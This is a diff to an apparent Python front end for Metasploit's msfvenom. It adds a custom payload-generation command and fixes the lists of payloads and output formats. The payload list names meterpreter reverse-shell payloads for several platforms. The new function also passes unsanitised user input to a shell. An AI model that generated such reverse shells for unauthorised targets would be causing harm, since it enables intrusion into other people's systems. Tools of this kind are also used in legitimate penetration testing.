@@ -100,7 +100,7 @@ def lask():
 def payloadgen1(payload, talkback, lhost, lport, outfile): #Not used as of now
     subprocess.run(["msfvenom", "-p", payload + "/meterpreter/reverse_" + talkback, "LHOST=" + lhost, "LPORT=" + str(lport), "-o", outfile])    
 def askformat():
-    None
+    pass
 
 def payloadgen2(payloadandsession, lhost, lport, outfile, args1, args2):
     try:
@@ -122,6 +122,19 @@ def payloadgen3(payload, outfile, args1, args2):
     asktb()
     print(f"{colorama.Fore.LIGHTCYAN_EX}Generating {payload} Payload...{colorama.Style.RESET_ALL}")  
     payloadgen2(payload, lhost, lport, outfile, args1, args2)
+
+def msfgen():
+    payyload = inputc("Enter Meterpreter payload: ")
+    args1 = inputc(f"Enter msfvenom args {colorama.Fore.LIGHTRED_EX}({colorama.Fore.LIGHTYELLOW_EX}msfvenom {colorama.Fore.LIGHTRED_EX}<{colorama.Fore.WHITE}msfvenom args{colorama.Fore.LIGHTRED_EX}>{colorama.Fore.BLUE} <payload> <payload args>{colorama.Fore.LIGHTRED_EX}){colorama.Fore.LIGHTYELLOW_EX}: ")
+    args2 = inputc(f"Enter msfvenom args {colorama.Fore.LIGHTRED_EX}({colorama.Fore.LIGHTYELLOW_EX}msfvenom <msfvenom args> <payload> {colorama.Fore.LIGHTRED_EX}<{colorama.Fore.WHITE}payload args{colorama.Fore.LIGHTRED_EX}>{colorama.Fore.BLUE}{colorama.Fore.LIGHTRED_EX}){colorama.Fore.LIGHTYELLOW_EX}: ")
+    try:
+        subprocess.run(f"msfvenom {args1} -p {payyload} {args2}", check=True,shell=True)   
+    except:
+        print(colorama.Fore.LIGHTRED_EX +  "An error has occured! Please read the above output and make sure you entered the options properly!" + colorama.Style.RESET_ALL)
+    else: 
+        print(colorama.Fore.LIGHTGREEN_EX + f"#====================#\nDone!\n#====================#\n\n" + colorama.Style.RESET_ALL)  
+    finally:
+        input(colorama.Fore.LIGHTBLUE_EX + "Press any key to continue" + colorama.Style.RESET_ALL)
 
 def asktb():
     global n, talkbackm1 
@@ -340,7 +353,9 @@ def shell():
             #LIST_PAYLOADS        
             elif shinput == "paylist" or shinput == "list payloads":
                 for element in pldlist:
-                       print( colorama.Fore.LIGHTMAGENTA_EX + "==>" + colorama.Fore.LIGHTWHITE_EX + element + colorama.Style.RESET_ALL)     
+                       print( colorama.Fore.LIGHTMAGENTA_EX + "==>" + colorama.Fore.LIGHTWHITE_EX + element + colorama.Style.RESET_ALL)  
+            elif shinput == "msfgen":
+                msfgen()              
             #SHELL_EXEC           
             else:
                 print(colorama.Fore.BLUE + "[*]Exec " +  colorama.Fore.WHITE + shinput  + "\n" + colorama.Style.RESET_ALL )
@@ -448,7 +463,7 @@ pldlist.append("[6] python/shell_reverse_tcp")
 pldlist.append("[7] android/meterpreter/reverse_tcp")
 pldlist.append("[8] android/meterpreter/reverse_https")
 pldlist.append("[9] linux/x86/meterpreter/reverse_tcp")
-pldlist.append("[9] linux/x64/meterpreter/reverse_http")
+pldlist.append("[10] linux/x64/meterpreter/reverse_http")
 
 #========================
 #command list 
@@ -458,19 +473,20 @@ cmdlist.append("[list] - show this page")
 cmdlist.append("[help] - show this page")
 cmdlist.append("[clear] - clear screen")
 cmdlist.append("[search] -  search for compatible payloads")
+cmdlist.append("[msfgen] - generate custom metasploit payload")
 
 #========================
 #format list 
 #========================
 formatlist = []
-cmdlist.append("[1] asp")
-cmdlist.append("[2] dll")
-cmdlist.append("[3] elf")
-cmdlist.append("[4] exe")
-cmdlist.append("[5] bin")
-cmdlist.append("[6] py")
-cmdlist.append("[7] bash")
-cmdlist.append("[8] sh")
+formatlist.append("[1] asp")
+formatlist.append("[2] dll")
+formatlist.append("[3] elf")
+formatlist.append("[4] exe")
+formatlist.append("[5] bin")
+formatlist.append("[6] py")
+formatlist.append("[7] bash")
+formatlist.append("[8] sh")
 def main():
     #there for future stuff
     time.sleep(0.1)
